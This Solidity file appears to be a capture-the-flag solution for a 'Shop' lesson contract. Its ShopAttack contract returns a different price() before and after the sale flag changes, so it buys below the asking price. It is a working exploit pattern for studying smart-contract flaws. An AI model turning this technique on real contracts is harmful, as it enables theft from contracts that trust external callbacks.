// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "../lessons/21-Shop.sol";

contract ShopAttack is Buyer {
    Shop shop;

    constructor(address shopAddress) public {
        shop = Shop(shopAddress);
    }

    function buy() public {
        shop.buy();
    }

    /**
     * Returns 100 if isSold == false, and 1 if isSold == true
     * Will return 100 to satisfy the if statement
     * After isSold is updated in Shop contract, will return 1 for actual buying price
     */
    function price() external view override returns (uint256) {
        bool isSold = shop.isSold();
        return isSold ? 1 : 100;
    }
}
